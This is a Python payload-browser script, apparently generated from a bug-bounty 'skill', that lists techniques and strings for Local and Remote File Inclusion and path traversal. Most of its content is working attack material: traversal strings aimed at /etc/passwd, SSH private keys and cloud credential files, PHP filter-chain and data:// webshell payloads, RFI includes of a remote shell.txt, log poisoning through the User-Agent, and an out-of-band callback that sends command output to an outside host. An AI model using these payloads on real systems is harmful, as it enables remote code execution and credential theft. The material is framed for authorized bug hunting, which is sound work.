#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-lfi

Skill: HUNT-LFI — Local / Remote File Inclusion & Path Traversal
Desc : Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, RFI via allow_url_include, directory traversal read/write/delete. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target.

Run:  python claude-bughunter-hunt-lfi.py --help
      python claude-bughunter-hunt-lfi.py --list
      python claude-bughunter-hunt-lfi.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-lfi'
TITLE = 'HUNT-LFI — Local / Remote File Inclusion & Path Traversal'
DESCRIPTION = 'Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, RFI via allow_url_include, directory traversal read/write/delete. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target.'

PAYLOADS = {
    'main': ["name: hunt-lfi", "description: \"Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal \u2014 /etc/passwd read, log poisoning \u2192 RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, RFI via allow_url_include, directory traversal read/write/delete. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target.\"", "sources: hackerone_public, synacktiv_research, portswigger_research", "report_count: 31"],
    'hunt-lfi-local-remote-file-inclusion-path-traversal': [],
    'crown-jewel-targets': ["LFI that reaches code execution is Critical. Pure file-read is High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.", "**Highest-value chains (in rough order of reliability in 2026):**", "- **PHP filter-chain \u2192 RCE** \u2014 the modern default. A bare `php://filter` *file-read* primitive is upgraded to RCE with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. This is the single most impactful thing to try and the most-missed.", "- **Log poisoning \u2192 RCE** \u2014 inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.", "- **PHP wrappers \u2192 source disclosure** \u2014 `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.", "- **RFI \u2192 RCE** \u2014 when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.", "- **phar:// deserialization** \u2014 a crafted PHAR + any unserialize-on-metadata sink \u2192 object-injection RCE.", "- **zip:// / data:// chains** and **session/upload poisoning** when filters block wrappers."],
    'oob-blind-lfi-confirmation-gate-read-first': ["LFI is frequently **blind**: the included content is parsed/executed but never reflected, or the page swallows the file into a template you can't see. Do **not** claim LFI from indirect signals alone."],
    'what-is-not-confirmation': ["- A different status code or error string for `../../etc/passwd` vs a normal value. The app may be string-matching `../` and returning a canned 403/500 without ever touching the filesystem.", "- Your input **echoed back** inside an error message (e.g. `failed to open '/var/www/../../etc/passwd'`). That is the path *formatter*, not proof the file was read. A genuine read shows file **contents**, not your path.", "- A page that \"looks different.\" Reflected-input or WAF block pages produce diffs unrelated to a real read."],
    'what-is-confirmation': ["- **Direct read:** actual file *contents* appear (real `root:x:0:0:` line, real PHP source after base64-decoding the filter output).", "- **Blind read via OOB exfil:** use a php://filter or XXE-style chain whose payload performs a DNS/HTTP callback to your **Burp Collaborator** subdomain, or use an `expect://` / wrapper that triggers an outbound request. A unique-per-sink Collaborator hit (DNS + HTTP, with the server's source IP) proves the include ran.", "- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable, repeatable response-length or latency delta = real filesystem access. Confirm with a third known-good path to rule out coincidence."],
    'default-workflow': ["1. Pick a **unique marker** target: prefer a file whose content you can fingerprint exactly (`/etc/passwd` \u2192 grep `^root:`). For blind, use a php://filter base64 read and decode \u2014 partial/truncated base64 still decodes to recognizable source.", "2. Generate a sub-tagged Collaborator payload per sink (`lfi-page.<collab>`, `lfi-tpl.<collab>`) so callbacks identify which parameter fired.", "3. Send, wait 30\u2013120s, poll OOB.", "4. Claim LFI **only** after a content match, a Collaborator callback, or a stable triple-confirmed timing/length delta. Echoed paths and lone status-code changes are retracted."],
    'attack-surface-signals': [],
    'url-body-parameters': ["?page=  ?file=  ?path=  ?template=  ?view=  ?lang=  ?module=", "?include=  ?doc=  ?load=  ?read=  ?content=  ?theme=  ?layout=", "?component=  ?download=  ?img=  ?pdf=  ?report=  ?style=  ?dir=", "JSON bodies: {\"filename\":...} {\"template\":...} {\"path\":...}"],
    'technology-stack-signals': [],
    'step-by-step-methodology': [],
    'phase-1-identify-candidates': ["```bash", "cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt", "grep -E \"(\\?|&)(page|file|path|template|view|lang|module|include|doc|load|read|content|download|img|pdf|report|dir)=\" \\", "recon/$TARGET/urls.txt", "ffuf -u \"https://$TARGET/FUZZ\" -w ~/wordlists/lfi-paths.txt -mc 200,301,302"],
    'phase-2-path-traversal-read': ["```bash", "?file=../../../etc/passwd", "?file=....//....//....//etc/passwd            # ../ stripping once \u2192 ....// survives", "?file=..%2f..%2f..%2fetc%2fpasswd             # single URL-encode", "?file=..%252f..%252f..%252fetc%252fpasswd     # double encode (decoded twice server-side)", "?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd          # encode dots too", "?file=/etc/passwd%00.png                      # null byte \u2014 PHP < 5.3.4 only", "?file=....\\/....\\/etc\\/passwd                  # mixed slash"],
    'prefix-forced-base-app-prepends-var-www-pad-with-extra-or-absolute-path-if-no-prefix': [],
    'utf-8-overlong-c0-ae-c0-ae-2f-legacy-servers': ["```bash"],
    'windows': ["?file=..\\..\\..\\windows\\win.ini", "?file=..%5c..%5c..%5cwindows%5cwin.ini", "?file=C:\\inetpub\\wwwroot\\web.config"],
    'phase-3-php-wrappers-source-disclosure': ["```bash", "?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 \u2192 source", "?file=php://filter/read=string.rot13/resource=config.php", "?file=php://filter/convert.base64-encode/resource=../app/Config.php"],
    'always-base64-encode-source-reads-raw-php-is-parsed-swallowed-and-you-see-nothing': [],
    'phase-4-php-filter-chain-rce-no-upload-no-writable-file': ["The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged \u2014 then `include()` runs it. **No upload endpoint, no log access, no writable path required.**", "```bash"],
    'generate-the-chain-public-tool-no-cve-it-abuses-documented-iconv-behaviour': [],
    'git-clone-https-github-com-synacktiv-php-filter-chain-generator': ["python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"c\"]); ?>'"],
    'tool-prints-a-long-php-filter-convert-iconv-resource-php-temp-string': [],
    'drop-it-into-the-sink': ["?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id", "Notes / gotchas:", "- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require`/`file_get_contents` on the param do).", "- Payloads get **long** (10\u201350KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).", "- For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents(\"http://x.<collab>/\".`id`);?>`) to confirm execution OOB.", "- This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read."],
    'phase-5-code-execution-wrappers-config-prerequisites': ["```bash"],
    'data-executes-inline-requires-allow-url-include-on': ["?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>"],
    'php-input-body-is-treated-as-the-included-resource-also-requires-allow-url-include-on': [],
    'post-file-php-input-body-php-system-get-c': [],
    'same-prerequisite-as-data-do-not-assume-this-works-on-default-php-config': [],
    'expect-direct-command-exec-requires-the-rare-expect-extension-loaded': ["?file=expect://id"],
    'phase-6-remote-file-inclusion-rfi': ["RFI = the include target is a **remote URL**. Prerequisite: `allow_url_include=On` (and `allow_url_fopen=On`). Off by default on modern PHP, but still seen on legacy/misconfigured hosts.", "```bash"],
    'host-a-payload-you-control-then': ["?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>", "?file=https://OOB-HOST/shell.txt?", "?file=ftp://OOB-HOST/shell.txt"],
    'detection-without-rce-point-at-a-burp-collaborator-http-url-a-callback-server-ip-the': [],
    'include-fetched-remotely-rfi-confirmed-even-if-execution-is-blocked-no-callback-not-rfi': [],
    'bypass-appended-extension-file-x-php-trailing-or-to-truncate-or-file-http-oob-shell': [],
    'phase-7-log-poisoning-rce': ["```bash"],
    'step-1-inject-php-into-a-log-the-include-can-read': ["curl -s \"https://$TARGET/\" -H \"User-Agent: <?php system(\\$_GET['c']); ?>\""],
    'step-2-include-it-verify-the-log-is-readable-first-read-it-plain-before-poisoning': ["?file=../../../var/log/apache2/access.log&c=id", "?file=../../../var/log/nginx/access.log&c=id", "?file=/proc/self/fd/0&c=id                  # stdin fd (varies)"],
    'candidate-logs-var-log-apache2-access-log-var-log-httpd-access-log': [],
    'var-log-nginx-access-log-var-log-auth-log-ssh-user-poisoning-proc-self-environ': [],
    'phase-8-session-upload-poisoning': ["```bash"],
    'php-session-set-payload-in-a-stored-field-username-profile-then-include-the-session-file': ["?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id", "?file=/tmp/sess_<PHPSESSID>&c=id"],
    'phar-object-injection-needs-an-unserialize-on-metadata-sink-any-file-upload': ["?file=phar:///var/www/uploads/evil.jpg     # JPEG magic bytes prepended to a PHAR"],
    'zip-archive-containing-the-target-or-a-symlink-to-etc-passwd': ["?file=zip:///var/www/uploads/a.zip%23path/inside.txt"],
    'phase-9-automation-then-manual-confirm-everything': ["```bash", "ffuf -u \"https://$TARGET/page.php?file=FUZZ\" -w ~/wordlists/lfi.txt -mc all -fr \"not found\"", "wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt --hh <baseline-len> \\", "\"https://$TARGET/page.php?file=FUZZ\"", "dotdotpwn -m http -h $TARGET -o unix"],
    'burp-intruder-over-the-bypass-table-collaborator-for-blind-rfi-confirmation': [],
    'named-cves-public-techniques-grounding': ["Verified, correctly-attributed references for the patterns above:", "- **PHP filter-chain to RCE** \u2014 Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.", "- **CVE-2021-41773** \u2014 Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) \u2192 file read, and RCE when `mod_cgi` is enabled.", "- **CVE-2021-42013** \u2014 Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) \u2192 traversal/RCE.", "- **CVE-2024-4577** \u2014 PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE."],
    'sensitive-files-to-read': [],
    'linux': ["/etc/passwd  /etc/hosts  /etc/shadow (rarely readable)", "/proc/self/environ  /proc/self/cmdline  /proc/self/status", "/var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php", "/home/*/.ssh/id_rsa  /root/.ssh/id_rsa  /root/.bash_history", "/var/www/html/app/config/parameters.yml   # Symfony", ".git/config  .git/HEAD  composer.json  package.json"],
    'app-cloud-secrets': ["/proc/self/environ  ~/.aws/credentials  ~/.docker/config.json  /run/secrets/*"],
    'windows-net': ["C:\\Windows\\win.ini  C:\\inetpub\\wwwroot\\web.config  ..\\..\\web.config", "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"],
    'bypass-table': [],
    'chain-table': [],
    'validation-discipline': ["**Direct-read proof (not a false positive):**", "- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value \u2014 the delta must be the file body, not a WAF/error page.", "- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.", "- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) \u2014 only the real file returns content.", "**Blind / OOB proof:**", "- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.", "- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise \u2014 retract.", "**Partial / truncated reads:**", "- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.", "**RCE proof:** show command output you control \u2014 `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). \"The payload was accepted\" is not RCE.", "**Severity:**", "- Non-sensitive file read: **Medium**", "- File read exposing DB creds / API keys / private keys / cloud creds: **High**", "- RCE via filter-chain / RFI / log / session / phar / CVE: **Critical**"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()